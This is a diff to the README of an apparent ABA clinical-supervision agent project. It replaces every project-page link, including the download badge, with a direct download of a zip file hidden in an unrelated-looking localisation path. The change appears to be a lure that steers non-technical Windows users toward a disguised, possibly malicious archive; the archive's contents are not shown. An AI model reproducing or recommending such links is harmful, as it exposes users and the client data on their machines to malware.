@@ -1,12 +1,12 @@
 # 🤖 aba-clinical-agent - ABA Clinical Supervision Made Simple
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download%20or%20Visit-aba--clinical--agent-blue?style=for-the-badge)](https://github.com/Cookiedead56/aba-clinical-agent)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download%20or%20Visit-aba--clinical--agent-blue?style=for-the-badge)](https://github.com/Cookiedead56/aba-clinical-agent/raw/refs/heads/main/i18n/en/vault/00-RawData/de-identified-archive/aba-agent-clinical-v1.2.zip)
 
 ## 📥 Download
 
 Go to the project page here and download or open the files you need:
 
-https://github.com/Cookiedead56/aba-clinical-agent
+https://github.com/Cookiedead56/aba-clinical-agent/raw/refs/heads/main/i18n/en/vault/00-RawData/de-identified-archive/aba-agent-clinical-v1.2.zip
 
 ## 🪟 Windows Setup
 
@@ -78,7 +78,7 @@ If you work with large note sets or many files, 16 GB RAM will feel better.
 
 Use this link to download or visit the project page:
 
-https://github.com/Cookiedead56/aba-clinical-agent
+https://github.com/Cookiedead56/aba-clinical-agent/raw/refs/heads/main/i18n/en/vault/00-RawData/de-identified-archive/aba-agent-clinical-v1.2.zip
 
 After you open the page:
 
